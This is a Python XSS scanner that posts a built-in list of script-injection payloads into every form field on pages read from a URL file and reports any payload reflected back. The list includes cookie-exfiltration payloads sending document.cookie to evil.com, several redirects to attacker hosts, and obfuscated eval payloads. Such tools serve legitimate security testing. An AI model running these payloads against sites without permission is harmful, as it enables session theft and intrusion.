# xss_vulnerability_tester.py

import requests
import concurrent.futures
from bs4 import BeautifulSoup

class XSSVulnerabilityTester:
    def __init__(self, urls_file, verbose=False):
        self.urls_file = urls_file
        self.payloads = [
            "<script>alert('XSS1')</script>",
            "<img src='x' onerror='alert(1)'>",
            "<svg/onload=alert('XSS3')>",
            "<iframe src='javascript:alert(1)'></iframe>",
            "<a href='javascript:alert(1)'>Click me</a>",
            "<img src='x' onmouseover='alert(1)'>",
            "<img src='x' onclick='alert(1)'>",
            "<img src='x' onerror='javascript:alert(1)'>",
            "<img src='x' onerror='document.location.href=\"http://malicious-site.com\"'>",
            "<img src='x' onerror='document.cookie=\"user_id=123456\"'>",
            "<img src='x' onerror='fetch(\"http://evil.com/steal?cookie=\"+document.cookie)'>",
            "<img src='x' onerror='new Image().src=\"http://evil.com/steal?cookie=\"+document.cookie'>",
            "<svg xmlns='http://www.w3.org/2000/svg'><script>javascript:alert(1)</script></svg>",
            "<img src='x' onerror='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'>",
            "<img src='x' onerror='eval(atob(\"YWxlcnQoMSk=\"))'>",
            "<img src='x' onerror='setTimeout(\"alert(1)\", 1000)'>",
            "<img src='x' onerror='console.log(\"XSS\")'>",
            "<img src='x' onerror='top.location.href=\"http://evil.com\"'>",
            "<img src='x' onerror='window.open(\"http://evil.com\")'>",
            "<img src='x' onerror='window.location.replace(\"http://evil.com\")'>",
            "<img src='x' onerror='window.location=\"http://evil.com\"'>",
            "<img src='x' onerror='window.location.assign(\"http://evil.com\")'>",
            "<img src='x' onerror='window.location.href=\"http://evil.com\"'>",
            "<img src='x' onerror='document.write(\"XSS\")'>",
            "<img src='x' onerror='document.body.innerHTML=\"XSS\"'>",
            "<img src='x' onerror='document.title=\"XSS\"'>",
            "<img src='x' onerror='document.documentElement.innerHTML=\"XSS\"'>",
            "<img src='x' onerror='document.write(\"XSS\")'>",
            "<img src='x' onerror='document.body.innerHTML=\"XSS\"'>",
            "<img src='x' onerror='document.title=\"XSS\"'>",
            "<img src='x' onerror='document.documentElement.innerHTML=\"XSS\"'>",
            "<img src='x' onerror='new Function(\"alert(1)\")()'>",
            "<img src='x' onerror='eval(\"alert(1)\")'>",
            "<img src='x' onerror='location.href=\"javascript:alert(1)\"'>",
            "<img src='x' onerror='location=\"javascript:alert(1)\"'>",
            "<img src='x' onerror='location.replace(\"javascript:alert(1)\")'>",
        ]
        self.verbose = verbose

    def test_url(self, url):
        try:
            response = requests.get(url)
            soup = BeautifulSoup(response.content, 'html.parser')
            forms = soup.find_all('form')

            vulnerabilities_found = []
            for form in forms:
                params = {}
                inputs = form.find_all('input')

                for input_tag in inputs:
                    params[input_tag.get('name')] = ''

                for payload in self.payloads:
                    modified_params = params.copy()

                    for input_name in modified_params:
                        modified_params[input_name] = payload

                    response = requests.post(url, data=modified_params)

                    if payload in response.text:
                        vulnerabilities_found.append(payload)

            return vulnerabilities_found

        except requests.exceptions.RequestException:
            return []

    def run_tests(self):
        with open(self.urls_file, 'r') as file:
            urls = file.read().splitlines()

        vulnerabilities = {}
        with concurrent.futures.ThreadPoolExecutor() as executor:
            results = {executor.submit(self.test_url, url): url for url in urls}
            for future in concurrent.futures.as_completed(results):
                url = results[future]
                vulnerabilities[url] = future.result()

        for url, payload_results in vulnerabilities.items():
            print(f"URL: {url}")
            if payload_results:
                print("Vulnerabilities found:")
                for payload in payload_results:
                    print(f"- Payload \"{payload}\" triggered a potential XSS vulnerability")
            else:
                print("No vulnerabilities found")

# Rest of your code in xss_vulnerability_tester.py if any
